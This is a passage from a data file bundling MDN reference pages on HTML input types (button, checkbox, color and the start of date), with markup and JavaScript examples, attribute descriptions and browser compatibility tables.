 <input type=\"button\" value=\"Button 1\" />\n  <input type=\"button\" value=\"Button 2\" />\n  <input type=\"button\" value=\"Button 3\" />\n</fieldset>\n```\n\njs\n\n```\nconst button = document.querySelector(\"input\");\nconst fieldset = document.querySelector(\"fieldset\");\n\nbutton.addEventListener(\"click\", disableButton);\n\nfunction disableButton() {\n  fieldset.disabled = true;\n  setTimeout(() => {\n    fieldset.disabled = false;\n  }, 2000);\n}\n```\n\n**Note:** Unlike other browsers, Firefox persists the `disabled` state of an `<input>` element even after the page is reloaded. As a workaround, set the `<input>` element's [`autocomplete`](../input#autocomplete) attribute to `off`. (See [Firefox bug 654072](https://bugzil.la/654072) for more details.)\n\n## Validation\n\nButtons don't participate in constraint validation; they have no real value to be constrained.\n\n## Examples\n\nThe below example shows a very simple drawing app created using a [`<canvas>`](../canvas) element and some simple CSS and JavaScript (we'll hide the CSS for brevity). The top two controls allow you to choose the color and size of the drawing pen. The button, when clicked, invokes a function that clears the canvas.\n\nhtml\n\n```\n<div class=\"toolbar\">\n  <input type=\"color\" aria-label=\"select pen color\" />\n  <input\n    type=\"range\"\n    min=\"2\"\n    max=\"50\"\n    value=\"30\"\n    aria-label=\"select pen size\" /><span class=\"output\">30</span>\n  <input type=\"button\" value=\"Clear canvas\" />\n</div>\n\n<canvas class=\"myCanvas\">\n  <p>Add suitable fallback here.</p>\n</canvas>\n```\n\njs\n\n```\nconst canvas = document.querySelector(\".myCanvas\");\nconst width = (canvas.width = window.innerWidth);\nconst height = (canvas.height = window.innerHeight - 85);\nconst ctx = canvas.getContext(\"2d\");\n\nctx.fillStyle = \"rgb(0 0 0)\";\nctx.fillRect(0, 0, width, height);\n\nconst colorPicker = document.querySelector('input[type=\"color\"]');\nconst sizePicker = document.querySelector('input[type=\"range\"]');\nconst output = document.querySelector(\".output\");\nconst clearBtn = document.querySelector('input[type=\"button\"]');\n\n// covert degrees to radians\nfunction degToRad(degrees) {\n  return (degrees * Math.PI) / 180;\n}\n\n// update sizepicker output value\n\nsizePicker.oninput = () => {\n  output.textContent = sizePicker.value;\n};\n\n// store mouse pointer coordinates, and whether the button is pressed\nlet curX;\nlet curY;\nlet pressed = false;\n\n// update mouse pointer coordinates\ndocument.onmousemove = (e) => {\n  curX = e.pageX;\n  curY = e.pageY;\n};\n\ncanvas.onmousedown = () => {\n  pressed = true;\n};\n\ncanvas.onmouseup = () => {\n  pressed = false;\n};\n\nclearBtn.onclick = () => {\n  ctx.fillStyle = \"rgb(0 0 0)\";\n  ctx.fillRect(0, 0, width, height);\n};\n\nfunction draw() {\n  if (pressed) {\n    ctx.fillStyle = colorPicker.value;\n    ctx.beginPath();\n    ctx.arc(\n      curX,\n      curY - 85,\n      sizePicker.value,\n      degToRad(0),\n      degToRad(360),\n      false,\n    );\n    ctx.fill();\n  }\n\n  requestAnimationFrame(draw);\n}\n\ndraw();\n```\n\n## Technical summary\n\n|                                 |                                                                                               |\n|---------------------------------|-----------------------------------------------------------------------------------------------|\n| **[Value](#value)**             | A string used as the button's label                                                           |\n| **Events**                      | [`click`](https://developer.mozilla.org/en-US/docs/Web/API/Element/click_event)               |\n| **Supported common attributes** | [`type`](../input#type) and [`value`](../input#value)                                         |\n| **IDL attributes**              | `value`                                                                                       |\n| **DOM interface**               | [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement)       |\n| **Methods**                     | None                                                                                          |\n| **Implicit ARIA Role**          | [`button`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/button_role) |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|          | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|          | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `button` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n## See also\n\n- [`<input>`](../input) and the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) interface which implements it.\n- The more modern [`<button>`](../button) element.\n- [Compatibility of CSS properties](https://developer.mozilla.org/en-US/docs/Learn/Forms/Property_compatibility_table_for_form_controls)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/button](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/button)"
- name: input type="checkbox"
  summary: <input> elements of type checkbox are rendered by default as boxes that are checked (ticked) when activated, like you might see in an official government paper form
  description: "# \\<input type=\"checkbox\"\\>\n\n[`<input>`](../input) elements of type `checkbox` are rendered by default as boxes that are checked (ticked) when activated, like you might see in an official government paper form. The exact appearance depends upon the operating system configuration under which the browser is running. Generally this is a square but it may have rounded corners. A checkbox allows you to select single values for submission in a form (or not).\n\n## Try it\n\n#### HTML Demo: \\<input type=\"checkbox\"\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <fieldset>\n      <legend>Choose your monster's features:</legend>\n\n      <div>\n        <input type=\"checkbox\" id=\"scales\" name=\"scales\" checked />\n        <label for=\"scales\">Scales</label>\n      </div>\n\n      <div>\n        <input type=\"checkbox\" id=\"horns\" name=\"horns\" />\n        <label for=\"horns\">Horns</label>\n      </div>\n    </fieldset>\n\n    p,\n    label {\n      font:\n        1rem 'Fira Sans',\n        sans-serif;\n    }\n\n    input {\n      margin: 0.4rem;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n**Note:** [Radio buttons](radio) are similar to checkboxes, but with an important distinction — [same-named radio buttons](radio#defining_a_radio_group) are grouped into a set in which only one radio button can be selected at a time, whereas checkboxes allow you to turn single values on and off. Where multiple same-named controls exist, radio buttons allow one to be selected out of them all, whereas checkboxes allow multiple values to be selected.\n\n## Value\n\nA string representing the value of the checkbox. This is not displayed on the client-side, but on the server this is the `value` given to the data submitted with the checkbox's `name`. Take the following example:\n\nhtml\n\n```\n<form>\n  <div>\n    <input\n      type=\"checkbox\"\n      id=\"subscribeNews\"\n      name=\"subscribe\"\n      value=\"newsletter\" />\n    <label for=\"subscribeNews\">Subscribe to newsletter?</label>\n  </div>\n  <div>\n    <button type=\"submit\">Subscribe</button>\n  </div>\n</form>\n```\n\nIn this example, we've got a name of `subscribe`, and a value of `newsletter`. When the form is submitted, the data name/value pair will be `subscribe=newsletter`.\n\nIf the `value` attribute was omitted, the default value for the checkbox is `on`, so the submitted data in that case would be `subscribe=on`.\n\n**Note:** If a checkbox is unchecked when its form is submitted, neither the name nor the value is submitted to the server. There is no HTML-only method of representing a checkbox's unchecked state (e.g. `value=unchecked`). If you wanted to submit a default value for the checkbox when it is unchecked, you could include JavaScript to create a [\\<input type=\"hidden\"\\>](hidden) within the form with a value indicating an unchecked state.\n\n## Additional attributes\n\nIn addition to the [common attributes](../input#attributes) shared by all [`<input>`](../input) elements, \"`checkbox`\" inputs support the following attributes.\n\n[`checked`](#checked)  \nA [boolean](https://developer.mozilla.org/en-US/docs/Glossary/Boolean/HTML) attribute indicating whether this checkbox is checked by default (when the page loads). It does *not* indicate whether this checkbox is currently checked: if the checkbox's state is changed, this content attribute does not reflect the change. (Only the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement)'s `checked` IDL attribute is updated.)\n\n**Note:** Unlike other input controls, a checkbox's value is only included in the submitted data if the checkbox is currently `checked`. If it is, then the value of the checkbox's `value` attribute is reported as the input's value, or `on` if no `value` is set. Unlike other browsers, Firefox by default [persists the dynamic checked state](https://stackoverflow.com/questions/5985839/bug-with-firefox-disabled-attribute-of-input-not-resetting-when-refreshing) of an `<input>` across page loads. Use the [`autocomplete`](../input#autocomplete) attribute to control this feature.\n\n[`value`](#value_2)  \nThe `value` attribute is one which all [`<input>`](../input)s share; however, it serves a special purpose for inputs of type `checkbox`: when a form is submitted, only checkboxes which are currently checked are submitted to the server, and the reported value is the value of the `value` attribute. If the `value` is not otherwise specified, it is the string `on` by default. This is demonstrated in the section [Value](#value) above.\n\n## Using checkbox inputs\n\nWe already covered the most basic use of checkboxes above. Let's now look at the other common checkbox-related features and techniques you'll need.\n\n### Handling multiple checkboxes\n\nThe example we saw above only contained one checkbox; in real-world situations you'll be likely to encounter multiple checkboxes. If they are completely unrelated, then you can just deal with them all separately, as shown above. However, if they're all related, things are not quite so simple.\n\nFor example, in the following demo we include multiple checkboxes to allow the user to select their interests (see the full version in the [Examples](#examples) section).\n\nhtml\n\n```\n<fieldset>\n  <legend>Choose your interests</legend>\n  <div>\n    <input type=\"checkbox\" id=\"coding\" name=\"interest\" value=\"coding\" />\n    <label for=\"coding\">Coding</label>\n  </div>\n  <div>\n    <input type=\"checkbox\" id=\"music\" name=\"interest\" value=\"music\" />\n    <label for=\"music\">Music</label>\n  </div>\n</fieldset>\n```\n\nIn this example you will see that we've given each checkbox the same `name`. If both checkboxes are checked and then the form is submitted, you'll get a string of name/value pairs submitted like this: `interest=coding&interest=music`. When this string reaches the server, you need to parse it other than as an associative array, so all values, not only the last value, of `interest` are captured. For one technique used with Python, see [Handle Multiple Checkboxes with a Single Serverside Variable](https://stackoverflow.com/questions/18745456/handle-multiple-checkboxes-with-a-single-serverside-variable), for example.\n\n### Checking boxes by default\n\nTo make a checkbox checked by default, you give it the `checked` attribute. See the below example:\n\nhtml\n\n```\n<fieldset>\n  <legend>Choose your interests</legend>\n  <div>\n    <input type=\"checkbox\" id=\"coding\" name=\"interest\" value=\"coding\" checked />\n    <label for=\"coding\">Coding</label>\n  </div>\n  <div>\n    <input type=\"checkbox\" id=\"music\" name=\"interest\" value=\"music\" />\n    <label for=\"music\">Music</label>\n  </div>\n</fieldset>\n```\n\n### Providing a bigger hit area for your checkboxes\n\nIn the above examples, you may have noticed that you can toggle a checkbox by clicking on its associated [`<label>`](../label) element as well as on the checkbox itself. This is a really useful feature of HTML form labels that makes it easier to click the option you want, especially on small-screen devices like smartphones.\n\nBeyond accessibility, this is another good reason to properly set up `<label>` elements on your forms.\n\n### Indeterminate state checkboxes\n\nA checkbox can be in an **indeterminate** state. This is set using the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) object's `indeterminate` property via JavaScript (it cannot be set using an HTML attribute):\n\njs\n\n```\ninputInstance.indeterminate = true;\n```\n\nWhen `indeterminate` is `true`, the checkbox has a horizontal line in the box (it looks somewhat like a hyphen or minus sign) instead of a check/tick in most browsers.\n\n**Note:** This is purely a visual change. It has no impact on whether the checkbox's `value` is used in a form submission. That is decided by the `checked` state, regardless of the `indeterminate` state.\n\nThere are not many use cases for this property. The most common is when a checkbox is available that \"owns\" a number of sub-options (which are also checkboxes). If all of the sub-options are checked, the owning checkbox is also checked, and if they're all unchecked, the owning checkbox is unchecked. If any one or more of the sub-options have a different state than the others, the owning checkbox is in the indeterminate state.\n\nThis can be seen in the below example (thanks to [CSS Tricks](https://css-tricks.com/indeterminate-checkboxes/) for the inspiration). In this example we keep track of the ingredients we are collecting for a recipe. When you check or uncheck an ingredient's checkbox, a JavaScript function checks the total number of checked ingredients:\n\n- If none are checked, the recipe name's checkbox is set to unchecked.\n- If one or two are checked, the recipe name's checkbox is set to `indeterminate`.\n- If all three are checked, the recipe name's checkbox is set to `checked`.\n\nSo in this case the `indeterminate` state is used to state that collecting the ingredients has started, but the recipe is not yet complete.\n\njs\n\n```\nconst overall = document.querySelector(\"#enchantment\");\nconst ingredients = document.querySelectorAll(\"ul input\");\n\noverall.addEventListener(\"click\", (e) => {\n  e.preventDefault();\n});\n\nfor (const ingredient of ingredients) {\n  ingredient.addEventListener(\"click\", updateDisplay);\n}\n\nfunction updateDisplay() {\n  let checkedCount = 0;\n  for (const ingredient of ingredients) {\n    if (ingredient.checked) {\n      checkedCount++;\n    }\n  }\n\n  if (checkedCount === 0) {\n    overall.checked = false;\n    overall.indeterminate = false;\n  } else if (checkedCount === ingredients.length) {\n    overall.checked = true;\n    overall.indeterminate = false;\n  } else {\n    overall.checked = false;\n    overall.indeterminate = true;\n  }\n}\n```\n\nComplete the recipe\n\nEnchantment table\n\nBook\n\nDiamonds (x2)\n\nObsidian (x4)\n\n## Validation\n\nCheckboxes do support [validation](../../constraint_validation) (offered to all [`<input>`](../input)s). However, most of the [`ValidityState`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState)s will always be `false`. If the checkbox has the [`required`](../input#required) attribute, but is not checked, then [`ValidityState.valueMissing`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/valueMissing) will be `true`.\n\n## Examples\n\nThe following example is an extended version of the \"multiple checkboxes\" example we saw above — it has more standard options, plus an \"other\" checkbox that when checked causes a text field to appear to enter a value for the \"other\" option. This is achieved with a simple block of JavaScript. The example includes implicit labels, with the `<input>` directly inside the `<label>`. The text input, without a visible label, includes the [`aria-label`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-label) attribute which provides its accessible name. This example also includes some CSS to improve the styling.\n\n### HTML\n\nhtml\n\n```\n<form>\n  <fieldset>\n    <legend>Choose your interests</legend>\n    <div>\n      <label>\n        <input type=\"checkbox\" id=\"coding\" name=\"interest\" value=\"coding\" />\n        Coding\n      </label>\n    </div>\n    <div>\n      <label>\n        <input type=\"checkbox\" id=\"music\" name=\"interest\" value=\"music\" />\n        Music\n      </label>\n    </div>\n    <div>\n      <label>\n        <input type=\"checkbox\" id=\"art\" name=\"interest\" value=\"art\" />\n        Art\n      </label>\n    </div>\n    <div>\n      <label>\n        <input type=\"checkbox\" id=\"sports\" name=\"interest\" value=\"sports\" />\n        Sports\n      </label>\n    </div>\n    <div>\n      <label>\n        <input type=\"checkbox\" id=\"cooking\" name=\"interest\" value=\"cooking\" />\n        Cooking\n      </label>\n    </div>\n    <div>\n      <label>\n        <input type=\"checkbox\" id=\"other\" name=\"interest\" value=\"other\" />\n        Other\n      </label>\n      <input\n        type=\"text\"\n        id=\"otherValue\"\n        name=\"other\"\n        aria-label=\"Other interest\" />\n    </div>\n    <div>\n      <button type=\"submit\">Submit form</button>\n    </div>\n  </fieldset>\n</form>\n```\n\n### CSS\n\ncss\n\n```\nhtml {\n  font-family: sans-serif;\n}\n\nform {\n  width: 600px;\n  margin: 0 auto;\n}\n\ndiv {\n  margin-bottom: 10px;\n}\n\nfieldset {\n  background: cyan;\n  border: 5px solid blue;\n}\n\nlegend {\n  padding: 10px;\n  background: blue;\n  color: cyan;\n}\n```\n\n### JavaScript\n\njs\n\n```\nconst otherCheckbox = document.querySelector(\"#other\");\nconst otherText = document.querySelector(\"#otherValue\");\notherText.style.visibility = \"hidden\";\n\notherCheckbox.addEventListener(\"change\", () => {\n  if (otherCheckbox.checked) {\n    otherText.style.visibility = \"visible\";\n    otherText.value = \"\";\n  } else {\n    otherText.style.visibility = \"hidden\";\n  }\n});\n```\n\n## Technical summary\n\n|                                 |                                                                                                                                                                                                                                                                                   |\n|---------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| **[Value](#value)**             | A string representing the value of the checkbox.                                                                                                                                                                                                                                  |\n| **Events**                      | [`change`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/change_event) and [`input`](https://developer.mozilla.org/en-US/docs/Web/API/Element/input_event)                                                                                                         |\n| **Supported common attributes** | [`checked`](#checked)                                                                                                                                                                                                                                                             |\n| **IDL attributes**              | [`checked`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/checked), [`indeterminate`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/indeterminate) and [`value`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/value) |\n| **DOM interface**               | [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement)                                                                                                                                                                                           |\n| **Methods**                     | [`select()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/select)                                                                                                                                                                                            |\n| **Implicit ARIA Role**          | [`checkbox`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/checkbox_role)                                                                                                                                                                                 |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|            | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|            | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `checkbox` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n## See also\n\n- [`:checked`](https://developer.mozilla.org/en-US/docs/Web/CSS/:checked), [`:indeterminate`](https://developer.mozilla.org/en-US/docs/Web/CSS/:indeterminate): CSS selectors that let you style checkboxes based on their current state\n- [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement): HTML DOM API that implements the `<input>` element\n- [CSS property compatibility table for form controls](https://developer.mozilla.org/en-US/docs/Learn/Forms/Property_compatibility_table_for_form_controls)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/checkbox](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/checkbox)"
- name: input type="color"
  summary: '<input> elements of type color provide a user interface element that lets a user specify a color, either by using a visual color picker interface or by entering the color into a text field in #rrggbb hexadecimal format'
  description: "# \\<input type=\"color\"\\>\n\n[`<input>`](../input) elements of type `color` provide a user interface element that lets a user specify a color, either by using a visual color picker interface or by entering the color into a text field in `#rrggbb` hexadecimal format.\n\nOnly simple colors (without alpha channel) are allowed though CSS colors has more formats, e.g. color names, functional notations and a hexadecimal format with an alpha channel.\n\nThe element's presentation may vary substantially from one browser and/or platform to another—it might be a simple textual input that automatically validates to ensure that the color information is entered in the proper format, or a platform-standard color picker, or some kind of custom color picker window.\n\n## Try it\n\n#### HTML Demo: \\<input type=\"color\"\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>Choose your monster's colors:</p>\n\n    <div>\n      <input type=\"color\" id=\"head\" name=\"head\" value=\"#e66465\" />\n      <label for=\"head\">Head</label>\n    </div>\n\n    <div>\n      <input type=\"color\" id=\"body\" name=\"body\" value=\"#f6b73c\" />\n      <label for=\"body\">Body</label>\n    </div>\n\n    p,\n    label {\n      font:\n        1rem 'Fira Sans',\n        sans-serif;\n    }\n\n    input {\n      margin: 0.4rem;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Value\n\nThe [`value`](../input#value) of an [`<input>`](../input) element of type `color` is always a string which contains a 7-character string specifying an RGB color in hexadecimal format. While you can input the color in either upper- or lower-case, it will be stored in lower-case form. The value is never in any other form, and is never empty.\n\n**Note:** Setting the value to anything that isn't a valid, fully-opaque, RGB color *in hexadecimal notation* will result in the value being set to `#000000`. In particular, you can't use CSS's standardized color names, or any CSS function syntax, to set the value. This makes sense when you keep in mind that HTML and CSS are separate languages and specifications. In addition, colors with an alpha channel are not supported; specifying a color in 9-character hexadecimal notation (e.g. `#009900aa`) will also result in the color being set to `#000000`.\n\n## Using color inputs\n\nInputs of type `color` are simple, due to the limited number of attributes they support.\n\n### Providing a default color\n\nYou can update the simple example above to set a default value, so that the color picker is pre-filled with the default color and the color picker (if any) will also default to that color:\n\nhtml\n\n```\n<input type=\"color\" value=\"#ff0000\" />\n```\n\nIf you don't specify a value, the default is `#000000`, which is black. The value must be in seven-character hexadecimal notation, meaning the \"#\" character followed by two digits each representing red, green, and blue, like this: `#rrggbb`. If you have colors that are in any other format (such as CSS color names or CSS color functions such as `rgb()` or `hsl()` ), you'll have to convert them to hexadecimal before setting the `value`.\n\n### Tracking color changes\n\nAs is the case with other [`<input>`](../input) types, there are two events that can be used to detect changes to the color value: [`input`](https://developer.mozilla.org/en-US/docs/Web/API/Element/input_event) and [`change`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/change_event). `input` is fired on the `<input>` element every time the color changes. The `change` event is fired when the user dismisses the color picker. In both cases, you can determine the new value of the element by looking at its [`value`](../input#value).\n\nHere's an example that watches changes over time to the color value:\n\njs\n\n```\ncolorPicker.addEventListener(\"input\", updateFirst, false);\ncolorPicker.addEventListener(\"change\", watchColorPicker, false);\n\nfunction watchColorPicker(event) {\n  document.querySelectorAll(\"p\").forEach((p) => {\n    p.style.color = event.target.value;\n  });\n}\n```\n\n### Selecting the value\n\nWhen a browser doesn't support a color picker interface, its implementation of color inputs will be a text box that validates the contents automatically to ensure that the value is in the correct format. In this case you can use the [`select()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/select) method to select the text currently in the edit field.\n\nIf the browser instead uses a color picker, `select()` does nothing. You should be aware of this behavior so your code can respond appropriately in either case.\n\njs\n\n```\ncolorPicker.select();\n```\n\n## Validation\n\nA color input's value is considered to be invalid if the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) is unable to convert the user's input into seven-character lower-case hexadecimal notation. If and when this is the case, the [`:invalid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:invalid) pseudo-class is applied to the element.\n\n## Example\n\nLet's create an example which does a little more with the color input by tracking the [`change`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/change_event) and [`input`](https://developer.mozilla.org/en-US/docs/Web/API/Element/input_event) events to take the new color and apply it to every [`<p>`](../p) element in the document.\n\n### HTML\n\nThe HTML is fairly straightforward — a couple of paragraphs of descriptive material with an [`<input>`](../input) of type `color` with the ID `color-picker`, which we'll use to change the color of the paragraphs' text.\n\nhtml\n\n```\n<p>\n  An example demonstrating the use of the\n  <code>&lt;input type=\"color\"&gt;</code> control.\n</p>\n\n<label for=\"color-picker\">Color:</label>\n<input type=\"color\" value=\"#ff0000\" id=\"color-picker\" />\n\n<p>\n  Watch the paragraph colors change when you adjust the color picker. As you\n  make changes in the color picker, the first paragraph's color changes, as a\n  preview (this uses the <code>input</code> event). When you close the color\n  picker, the <code>change</code> event fires, and we detect that to change\n  every paragraph to the selected color.\n</p>\n```\n\n### JavaScript\n\nFirst, there's some setup. Here we establish some variables, setting up a variable that contains the color we'll set the color picker to when we first load up, and then setting up a [`load`](https://developer.mozilla.org/en-US/docs/Web/API/Window/load_event) handler to do the main startup work once the page is fully loaded.\n\njs\n\n```\nlet colorPicker;\nconst defaultColor = \"#0000ff\";\n\nwindow.addEventListener(\"load\", startup, false);\n```\n\n#### Initialization\n\nOnce the page is loaded, our `load` event handler, `startup()`, is called:\n\njs\n\n```\nfunction startup() {\n  colorPicker = document.querySelector(\"#color-picker\");\n  colorPicker.value = defaultColor;\n  colorPicker.addEventListener(\"input\", updateFirst, false);\n  colorPicker.addEventListener(\"change\", updateAll, false);\n  colorPicker.select();\n}\n```\n\nThis gets a reference to the color `<input>` element in a variable called `colorPicker`, then sets the color input's value to the value in `defaultColor`. Then the color input's [`input`](https://developer.mozilla.org/en-US/docs/Web/API/Element/input_event) event is set up to call our `updateFirst()` function, and the [`change`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/change_event) event is set to call `updateAll()`. These are both seen below.\n\nFinally, we call [`select()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/select) to select the text content of the color input if the control is implemented as a text field (this has no effect if a color picker interface is provided instead).\n\n#### Reacting to color changes\n\nWe provide two functions that deal with color changes. The `updateFirst()` function is called in response to the `input` event. It changes the color of the first paragraph element in the document to match the new value of the color input. Since `input` events are fired every time an adjustment is made to the value (for example, if the brightness of the color is increased), these will happen repeatedly as the color picker is used.\n\njs\n\n```\nfunction updateFirst(event) {\n  const p = document.querySelector(\"p\");\n  if (p) {\n    p.style.color = event.target.value;\n  }\n}\n```\n\nWhen the color picker is dismissed, indicating that the value will not change again (unless the user re-opens the color picker), a `change` event is sent to the element. We handle that event using the `updateAll()` function, using [`Event.target.value`](../input#value) to obtain the final selected color:\n\njs\n\n```\nfunction updateAll(event) {\n  document.querySelectorAll(\"p\").forEach((p) => {\n    p.style.color = event.target.value;\n  });\n}\n```\n\nThis sets the color of every [`<p>`](../p) block so that its [`color`](https://developer.mozilla.org/en-US/docs/Web/CSS/color) attribute matches the current value of the color input, which is referred to using [`event.target`](https://developer.mozilla.org/en-US/docs/Web/API/Event/target).\n\n### Result\n\nThe final result looks like this:\n\n## Technical summary\n\n|                                 |                                                                                                                                                                           |\n|---------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| **[Value](#value)**             | A 7-character string specifying a [`<color>`](https://developer.mozilla.org/en-US/docs/Web/CSS/color_value) in lower-case hexadecimal notation                            |\n| **Events**                      | [`change`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/change_event) and [`input`](https://developer.mozilla.org/en-US/docs/Web/API/Element/input_event) |\n| **Supported common attributes** | [`autocomplete`](../input#autocomplete) and [`list`](../input#list)                                                                                                       |\n| **IDL attributes**              | `list` and `value`                                                                                                                                                        |\n| **DOM interface**               | [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement)                                                                                   |\n| **Methods**                     | [`select()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/select)                                                                                    |\n| **Implicit ARIA Role**          | [no corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                                                                       |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [Compatibility of CSS properties](https://developer.mozilla.org/en-US/docs/Learn/Forms/Property_compatibility_table_for_form_controls)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/color](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/color)"
- name: input type="date"
  summary: <input> elements of type="date" create input fields that let the user enter a date
  description: "# \\<input type=\"date\"\\>\n\n[`<input>`](../input) elements of `type=\"date\"` create input fields that let the user enter a date. The appearance of the date picker input UI varies based on the browser and operating system. The value is normalized to the format `yyyy-mm-dd`.\n\nThe resulting value includes the year, month, and day, but *not* the time. The [time](time) and [datetime-local](datetime-local) input types support time and date+time input.\n\n## Try it\n\n#### HTML Demo: \\<input type=\"date\"\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"start\">Start date:</label>\n\n    <input type=\"date\" id=\"start\" name=\"trip-start\" value=\"2018-07-22\" min=\"2018-01-01\" max=\"2018-12-31\" />\n\n    label {\n      display: block;\n      font:\n        1rem 'Fira Sans',\n        sans-serif;\n    }\n\n    input,\n    label {\n      margin: 0.4rem 0;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Value\n\nA string representing the date entered in the input. The date is formatted according to [Date strings format](../../date_and_time_formats#date_strings).\n\nYou can set a default value for the input with a date inside the [`value`](../input#value) attribute, like so:\n\nhtml\n\n```\n<input type=\"date\" value=\"2017-06-01\" />\n```\n\n**Note:** The displayed date format will differ from the actual `value` — the displayed date is formatted *based on the locale of the user's browser*, but the parsed `value` is always formatted `yyyy-mm-dd`.\n\nYou can get and set the date value in JavaScript with the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) `value` and `valueAsNumber` properties. For example:\n\njs\n\n```\nconst dateControl = document.querySelector('input[type=\"date\"]');\ndateControl.value = \"2017-06-01\";\nconsole.log(dateControl.value); // prints \"2017-06-01\"\nconsole.log(dateControl.valueAsNumber); // prints 1496275200000, a JavaScript timestamp (ms)\n```\n\nThis code finds the first [`<input>`](../input) element whose `type` is `date`, and sets its value to `2017-06-01` (June 1st, 2017). It then reads that value back in string and number formats.\n\n## Additional attributes\n\nThe attributes common to all [`<input>`](../input) elements apply to the `date` inputs as well, but might not influence its presentation. For example `size` and `placeholder` might not work. `date` inputs have the following additional attributes.\n\n### max\n\nThe latest date to accept. If the [`value`](../input#value) entered into the element occurs afterward, the element fails [constraint validation](../../constraint_validation). If the value of the `max` attribute isn't a possible date string in the format `yyyy-mm-dd`, then the element has no maximum date value.\n\nIf both the `max` and `min` attributes are set, this value must be a date string **later than or equal to** the one in the `min` attribute.\n\n### min\n\nThe earliest date to accept. If the [`value`](../input#value) entered into the element occurs beforehand, the element fails [constraint validation](../../constraint_validation). If the value of the `min` attribute isn't a possible date string in the format `yyyy-mm-dd`, then the element has no minimum date value.\n\nIf both the `max` and `min` attributes are set, this value must be a date string **earlier than or equal to** the one in the `max` attribute.\n\n### step\n\nThe `step` attribute is a number that specifies the granularity that the value must adhere to, or the special value `any`, which is described below. Only values which are equal to the basis for stepping ([`min`](#min) if specified, [`value`](../input#value) otherwise, and an appropriate default value if neither of those is provided) are valid.\n\nA string value of `any` means that no stepping is implied, and any value is allowed (barring other constraints, such as [`min`](#min) and [`max`](#max)).\n\n**Note:** When the data entered by the user doesn't adhere to the stepping configuration, the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) may round to the nearest valid value, preferring numbers in the positive direction when there are two equally close options.\n\nFor `date` inputs, the value of `step` is given in days; and is treated as a number of milliseconds equal to 86,400,000 times the `step` value (the underlying numeric value is in milliseconds). 